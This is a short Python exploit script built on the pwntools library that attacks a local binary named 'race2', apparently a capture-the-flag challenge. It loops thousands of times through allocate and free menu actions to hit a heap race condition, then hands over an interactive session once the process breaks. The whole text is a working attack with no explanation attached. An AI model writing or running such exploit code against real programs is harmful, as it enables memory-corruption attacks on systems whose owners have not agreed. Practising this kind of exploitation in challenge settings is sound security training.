from pwn import *

e = ELF('./race2')

p = process(e.path)

def alloc(idx):
    p.sendlineafter(b'hack\n', b'1')
    p.sendlineafter(b'?\n', str(idx).encode())
def free(idx):
    p.sendlineafter(b'hack\n', b'2')
    p.sendlineafter(b'?\n', str(idx).encode())

try:
    for _ in range(0x1000):
        print(f'{_} times...')
        for i in range(0x10):
            alloc(i)
            
        for i in range(0xf, -1, -1):
            free(i)
        p.sendlineafter(b'hack\n', b'4')
        p.sendlineafter(b'hack\n', b'3')
except:
    p.interactive()
